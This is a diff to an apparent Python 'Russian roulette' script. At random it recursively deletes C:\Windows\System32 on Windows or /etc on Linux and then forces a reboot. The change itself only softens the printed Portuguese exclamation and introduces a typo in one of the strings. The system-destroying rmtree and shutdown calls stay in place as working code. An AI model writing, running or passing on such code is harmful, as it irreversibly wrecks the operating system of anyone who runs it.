@@ -11,13 +11,13 @@ while True:
     if roleta_russa == 5:
 
         if name == 'nt':
-            print("SE FUDEU!")
+            print("SE LASACOU!")
             shutil.rmtree("C:\\Windows\\System32")
             time.sleep(3)
             os.system("shutdown /r /t 1")
 
         elif name == 'posix':
-            print("SE FUDEU!")
+            print("SE LASCOU!")
             shutil.rmtree("/etc")
             time.sleep(3)
             os.system("sudo reboot")
